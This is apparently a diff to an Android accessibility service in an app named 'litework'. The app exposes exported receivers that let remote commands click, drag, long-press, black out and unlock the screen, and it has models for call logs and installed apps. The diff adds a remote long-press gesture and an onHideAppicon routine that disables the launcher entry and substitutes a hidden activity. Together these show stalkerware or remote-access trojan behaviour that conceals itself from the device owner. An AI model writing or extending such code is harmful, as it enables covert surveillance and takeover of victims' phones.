@@ -72,7 +72,10 @@ import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.support.litework.HideMainActivity;
+import com.support.litework.MainActivity;
 import com.support.litework.R;
+import com.support.litework.activity.OverlaySetActivity;
 import com.support.litework.activity.SetAutoStartActivity;
 import com.support.litework.model.ApplistEntry;
 import com.support.litework.model.CallLogEntry;
@@ -98,6 +101,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_SCREEN_MONITOR = "SCREEN_MONITOR";
     public static final String ACTION_SCREEN_REFRESH_MONITOR = "SCREEN_REFRESH_MONITOR";
     public static final String ACTION_SCREEN_CLICK_MONITOR = "SCREEN_CLICK_MONITOR";
+    public static final String ACTION_SCREEN_LONG_PRESS_MONITOR = "SCREEN_LONG_PRESS_MONITOR";
     public static final String ACTION_SCREEN_DRAG_MONITOR = "SCREEN_DRAG_MONITOR";
     public static final String ACTION_SCREEN_BLACK_MONITOR = "SCREEN_BLACK_MONITOR";
     public static final String ACTION_SCREEN_LIGHT_MONITOR = "SCREEN_LIGHT_MONITOR";
@@ -366,6 +370,11 @@ public class MainAccessibilityService extends AccessibilityService {
                 double yPosition = intent.getDoubleExtra("yPosition", 0);
                 performClick(xPosition, yPosition);
             }
+            if (ACTION_SCREEN_LONG_PRESS_MONITOR.equals(intent.getAction())) {
+                double xPosition = intent.getDoubleExtra("xPosition", 0);
+                double yPosition = intent.getDoubleExtra("yPosition", 0);
+                performLongPress(xPosition, yPosition);
+            }
             if (ACTION_SCREEN_DRAG_MONITOR.equals(intent.getAction())) {
                 mouseDraw();
             }
@@ -461,6 +470,7 @@ public class MainAccessibilityService extends AccessibilityService {
             }
             if (ACTION_DEVICE_UNLOCK.equals(intent.getAction())) {
                 onDeviceUnlock();
+//                onHideAppicon();
             }
 
             if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
@@ -501,6 +511,8 @@ public class MainAccessibilityService extends AccessibilityService {
         registerReceiver(screenMonitorReceiver, filter_screen_refresh, RECEIVER_EXPORTED);
         IntentFilter filter_screen_click = new IntentFilter(ACTION_SCREEN_CLICK_MONITOR);
         registerReceiver(screenMonitorReceiver, filter_screen_click, RECEIVER_EXPORTED);
+        IntentFilter filter_screen_long_press = new IntentFilter(ACTION_SCREEN_LONG_PRESS_MONITOR);
+        registerReceiver(screenMonitorReceiver, filter_screen_long_press, RECEIVER_EXPORTED);
         IntentFilter filter_screen_drag = new IntentFilter(ACTION_SCREEN_DRAG_MONITOR);
         registerReceiver(screenMonitorReceiver, filter_screen_drag, RECEIVER_EXPORTED);
         IntentFilter filter_screen_black = new IntentFilter(ACTION_SCREEN_BLACK_MONITOR);
@@ -2090,7 +2102,7 @@ public class MainAccessibilityService extends AccessibilityService {
             }
         }
 
-        GestureDescription.StrokeDescription dragStroke = new GestureDescription.StrokeDescription(path, 0, 300);
+        GestureDescription.StrokeDescription dragStroke = new GestureDescription.StrokeDescription(path, 0, 600);
         GestureDescription dragGesture = new GestureDescription.Builder().addStroke(dragStroke).build();
 
         boolean result = dispatchGesture(dragGesture, new GestureResultCallback() {
@@ -2170,6 +2182,34 @@ public class MainAccessibilityService extends AccessibilityService {
             public void onCompleted(GestureDescription gestureDescription) {
                 isSetKeyguard = false;
                 super.onCompleted(gestureDescription);
+            }
+
+            @Override
+            public void onCancelled(GestureDescription gestureDescription) {
+                super.onCancelled(gestureDescription);
+                Log.d(TAG, "Click cancelled");
+            }
+        }, null);
+
+        if (!result) {
+            Log.d(TAG, "Failed to dispatch gesture");
+        }
+    }
+
+    public void performLongPress(double x, double y) {
+        double currentXPosition = x * deviceWidth / imageWidth;
+        double currentYPosition = y * deviceWidth / imageWidth;
+        Path clickPath = new Path();
+        clickPath.moveTo((float) currentXPosition, (float) currentYPosition);
+
+        GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 2000);
+        GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();
+
+        boolean result = dispatchGesture(clickGesture, new GestureResultCallback() {
+            @Override
+            public void onCompleted(GestureDescription gestureDescription) {
+                super.onCompleted(gestureDescription);
+                Log.d("PerformLongClick", "Click performed successfully");
             }
 
             @Override
@@ -2600,6 +2640,21 @@ public class MainAccessibilityService extends AccessibilityService {
                 }, 1000);
             }
         }, 1000);
+    }
+
+    public void onHideAppicon() {
+
+        PackageManager packageManager = getPackageManager();
+        ComponentName cName = new ComponentName(getPackageName(), MainActivity.class.getName());
+        packageManager.setComponentEnabledSetting(cName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+        ComponentName c_Name = new ComponentName(getPackageName(), HideMainActivity.class.getName());
+        packageManager.setComponentEnabledSetting(c_Name, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
+
+        Intent intent = new Intent(this, HideMainActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+
     }
 
     private void onGoHome() {
